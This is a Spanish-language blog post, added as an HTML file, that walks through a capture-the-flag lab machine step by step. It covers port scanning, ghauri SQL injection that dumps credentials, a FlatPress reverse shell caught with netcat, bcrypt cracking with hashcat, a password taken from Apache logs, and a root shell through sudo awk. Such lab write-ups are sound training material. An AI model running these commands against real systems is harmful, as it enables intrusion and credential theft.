@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | </title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title"></h2>
+          <small class="date">13 Sep 2024</small>
+          <div class="categories">
+            
+          </div>
+        </div>
+        <div class="content">
+<h3 id="2-escaneo-de-puertos">2: Escaneo de puertos</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.0.2.10 <span class="nt">-b</span> 10
+</code></pre></div></div>
+
+<p>Usamos <code class="language-plaintext highlighter-rouge">rustscan</code>, que es una herramienta rápida de escaneo de puertos, para ver qué puertos están abiertos en la máquina con IP <code class="language-plaintext highlighter-rouge">10.0.2.10</code>. La opción <code class="language-plaintext highlighter-rouge">-a</code> especifica la dirección IP, y <code class="language-plaintext highlighter-rouge">-b</code> es para el batch size (número de puertos que se escanean simultáneamente).</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Open 10.0.2.10:22
+Open 10.0.2.10:80
+Open 10.0.2.10:8080
+</code></pre></div></div>
+
+<p>Esto nos dice que los puertos 22 (SSH), 80 (HTTP) y 8080 (HTTP alternativo) están abiertos.</p>
+
+<hr>
+
+<h3 id="3-escaneo-detallado-con-nmap">3: Escaneo detallado con Nmap</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,8080 10.0.2.10
+</code></pre></div></div>
+
+<p>Con <code class="language-plaintext highlighter-rouge">nmap</code> hacemos un escaneo más profundo en los puertos descubiertos, usando las opciones <code class="language-plaintext highlighter-rouge">-sCV</code> para obtener versiones de los servicios y ejecutar scripts básicos. La opción <code class="language-plaintext highlighter-rouge">-p</code> especifica los puertos a escanear.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
+8080/tcp open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
+</code></pre></div></div>
+
+<p>Vemos que el puerto 22 está corriendo <code class="language-plaintext highlighter-rouge">OpenSSH</code>, y los puertos 80 y 8080 están usando el servidor web Apache. Además, el puerto 80 está corriendo una aplicación llamada <code class="language-plaintext highlighter-rouge">FlatPress</code>.</p>
+
+<hr>
+
+<h3 id="4-explotación-con-sqli">4: Explotación con SQLi</h3>
+<p>Echamos un vistazo a las webs que hay en el puerto 80 y 8080 y vemos que hay un posible SQLi al realizar una busqueda.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-u</span> http://10.0.2.10:8080/search.php?query<span class="o">=</span>a <span class="nt">--dbs</span>
+</code></pre></div></div>
+
+<p>Se utilizó <code class="language-plaintext highlighter-rouge">ghauri</code>, una herramienta para explotar inyecciones SQL (SQLi). La opción <code class="language-plaintext highlighter-rouge">-u</code> indica la URL objetivo, y <code class="language-plaintext highlighter-rouge">--dbs</code> pide que se enumeren las bases de datos disponibles.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>available databases <span class="o">[</span>6]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Nombres
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sys
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> FlatPress
+</code></pre></div></div>
+
+<p>Esto confirma que se puede explotar la vulnerabilidad SQLi, y muestra las bases de datos disponibles. Nos interesa la base de datos <code class="language-plaintext highlighter-rouge">FlatPress</code>.</p>
+
+<hr>
+
+<h3 id="5-dump-de-la-tabla-de-login">5: Dump de la tabla de login</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-u</span> http://10.0.2.10:8080/search.php?query<span class="o">=</span>a <span class="nt">-D</span> FlatPress <span class="nt">-T</span> login <span class="nt">--dump</span>
+</code></pre></div></div>
+
+<p>Aquí estamos dumpeando (extrayendo) el contenido de la tabla <code class="language-plaintext highlighter-rouge">login</code> en la base de datos <code class="language-plaintext highlighter-rouge">FlatPress</code>. La opción <code class="language-plaintext highlighter-rouge">-D</code> especifica la base de datos, <code class="language-plaintext highlighter-rouge">-T</code> la tabla, y <code class="language-plaintext highlighter-rouge">--dump</code> para volcar el contenido.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----+--------+-----------------------+
+| <span class="nb">id</span> | user   | password              |
++----+--------+-----------------------+
+| 1  | r0dgar | SNIETbkGBCnhFqeUJuqBO |
++----+--------+-----------------------+
+</code></pre></div></div>
+
+<p>Logramos extraer las credenciales del usuario <code class="language-plaintext highlighter-rouge">r0dgar</code>.
+Nos logueamos en el panel de admin con las credenciales y aprovechando de una vulnerabilidad que hay en la versión de FlatPress, subimos una shell reversa. Podemos seguir los pasos que explican aquí <a href="https://github.com/flatpressblog/flatpress/issues/152">https://github.com/flatpressblog/flatpress/issues/152</a></p>
+
+<hr>
+
+<h3 id="6-iniciar-un-listener-con-netcat">6: Iniciar un listener con Netcat</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+</code></pre></div></div>
+
+<p>Con este comando usamos <code class="language-plaintext highlighter-rouge">netcat</code> para iniciar un listener en el puerto 8888. La opción <code class="language-plaintext highlighter-rouge">-n</code> deshabilita DNS, <code class="language-plaintext highlighter-rouge">-l</code> es para escuchar conexiones entrantes, <code class="language-plaintext highlighter-rouge">-v</code> para modo detallado, y <code class="language-plaintext highlighter-rouge">-p</code> especifica el puerto.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ncat: Connection from 10.0.2.10:52336.
+</code></pre></div></div>
+
+<p>Se establece una conexión desde la IP <code class="language-plaintext highlighter-rouge">10.0.2.10</code>. Hacemos el tratamiento de la tty y ya estamos dentro del servidor.</p>
+
+<hr>
+
+<h3 id="7-ver-usuarios-del-sistema">7: Ver usuarios del sistema</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Base:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
+</code></pre></div></div>
+
+<p>Este comando muestra todos los usuarios del sistema que tienen acceso a un shell bash.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+pedro:x:1001:1001::/home/pedro:/bin/bash
+flate:x:1002:1002::/home/flate:/bin/bash
+</code></pre></div></div>
+
+<p>Tenemos dos usuarios: <code class="language-plaintext highlighter-rouge">pedro</code> y <code class="language-plaintext highlighter-rouge">flate</code>.</p>
+
+<hr>
+
+<h3 id="8-buscar-archivos-de-pedro">8: Buscar archivos de pedro</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Base:/<span class="nv">$ </span>find / <span class="nt">-user</span> pedro <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Buscamos archivos que pertenezcan al usuario <code class="language-plaintext highlighter-rouge">pedro</code>. La opción <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> es para ocultar mensajes de error.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/hash.txt
+</code></pre></div></div>
+
+<p>Encontramos un archivo interesante: <code class="language-plaintext highlighter-rouge">/opt/hash.txt</code>.</p>
+
+<hr>
+
+<h3 id="9-ver-contenido-del-archivo-hashtxt">9: Ver contenido del archivo hash.txt</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Base:/<span class="nv">$ </span><span class="nb">cat</span> /opt/hash.txt
+</code></pre></div></div>
+
+<p>Mostramos el contenido del archivo.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$2b$12$Qq75yQ3G</span>.ydG2nxr4LzAPeJ6GE8po1NtjOAGZ2l1aIGa5//I5J/Xq
+</code></pre></div></div>
+
+<p>Parece ser un hash bcrypt.</p>
+
+<hr>
+
+<h3 id="10-cracking-del-hash">10: Cracking del hash</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-m</span> 3200 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>Usamos <code class="language-plaintext highlighter-rouge">hashcat</code> para crackear el hash usando la wordlist <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$2b$12$Qq75yQ3G</span>.ydG2nxr4LzAPeJ6GE8po1NtjOAGZ2l1aIGa5//I5J/Xq:secret
+</code></pre></div></div>
+
+<p>La contraseña correspondiente al hash es <code class="language-plaintext highlighter-rouge">secret</code>.</p>
+
+<hr>
+
+<h3 id="11-buscar-en-logs-de-apache">11: Buscar en logs de Apache</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-rnw</span> flate <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Buscamos la palabra <code class="language-plaintext highlighter-rouge">flate</code> en los logs de Apache.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./access.log.1:21:203.0.113.56 - flate <span class="o">[</span>12/Sep/2024:12:03:55 +0000] <span class="s2">"POST /login HTTP/1.1"</span> 401 4812 <span class="s2">"username=flate&amp;password=HPAbcmOgSjidaoWkXUQjw"</span>
+</code></pre></div></div>
+
+<p>Encontramos las credenciales de <code class="language-plaintext highlighter-rouge">flate</code>: <code class="language-plaintext highlighter-rouge">HPAbcmOgSjidaoWkXUQjw</code>.</p>
+
+<hr>
+
+<h3 id="paso-12-cambiar-a-usuario-flate">Paso 12: Cambiar a usuario flate</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span>su flate
+</code></pre></div></div>
+
+<p>Usamos el comando <code class="language-plaintext highlighter-rouge">su</code> para cambiar al usuario <code class="language-plaintext highlighter-rouge">flate</code> usando la contraseña encontrada.</p>
+
+<hr>
+
+<h3 id="13-escalada-de-privilegios">13: Escalada de privilegios</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flate@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p>Vemos qué comandos puede ejecutar <code class="language-plaintext highlighter-rouge">flate</code> como root.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/awk
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">flate</code> puede ejecutar <code class="language-plaintext highlighter-rouge">awk</code> como root sin contraseña.</p>
+
+<hr>
+
+<h3 id="paso-14-obtener-shell-root">Paso 14: Obtener shell root</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flate@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span><span class="nb">sudo awk</span> <span class="s1">'BEGIN {system("/bin/bash")}'</span>
+</code></pre></div></div>
+
+<p>Usamos <code class="language-plaintext highlighter-rouge">awk</code> para ejecutar un shell como root, aprovechando el permiso <code class="language-plaintext highlighter-rouge">NOPASSWD</code>.</p>
+
+<p>Salida:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@TheHackersLabs-Base:/var/log/apache2#
+</code></pre></div></div>
+
+<p>¡Ya somos root!</p>
+
+<hr>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
